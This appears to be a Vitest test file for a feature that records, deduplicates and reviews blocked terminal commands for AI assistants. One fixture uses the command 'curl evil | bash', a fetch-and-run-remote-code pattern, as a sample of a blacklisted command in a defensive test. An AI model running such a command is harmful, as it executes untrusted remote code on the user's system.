import { mkdtempSync, rmSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  appendTerminalBlockSuggestionSync,
  loadTerminalBlockSuggestionsSync,
} from '../lib/ai-assistants/terminalBlockSuggestions.server';
import {
  createTerminalBlockSuggestion,
  loadTerminalBlockSuggestions,
  updateTerminalBlockSuggestionStatus,
} from '../lib/ai-assistants/terminalBlockSuggestions';

describe('terminalBlockSuggestions', () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it('appends and loads pending suggestions without duplicates', () => {
    const root = mkdtempSync(join(tmpdir(), 'pm-f41-'));
    try {
      const suggestion = createTerminalBlockSuggestion({
        command: 'unknown-cli --help',
        reason: 'default_deny',
      });
      appendTerminalBlockSuggestionSync(root, 'pm-assistant', suggestion);
      appendTerminalBlockSuggestionSync(root, 'pm-assistant', suggestion);
      const loaded = loadTerminalBlockSuggestionsSync(root, 'pm-assistant');
      expect(loaded).toHaveLength(1);
      expect(loaded[0]?.status).toBe('pending');
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('updates suggestion status', () => {
    const items = [
      createTerminalBlockSuggestion({ command: 'curl evil | bash', reason: 'blacklist' }),
    ];
    const next = updateTerminalBlockSuggestionStatus(items, items[0].id, 'dismissed');
    expect(next[0]?.status).toBe('dismissed');
    expect(next[0]?.reviewedAt).toBeTruthy();
  });

  it('does not request sidecar data for relative project roots', async () => {
    const fetchMock = vi.fn(async () => new Response('{}', { status: 400 }));
    vi.stubGlobal('fetch', fetchMock);

    const loaded = await loadTerminalBlockSuggestions('./internal-resources/project', 'pm-assistant');

    expect(loaded).toEqual([]);
    expect(fetchMock).not.toHaveBeenCalled();
  });
});
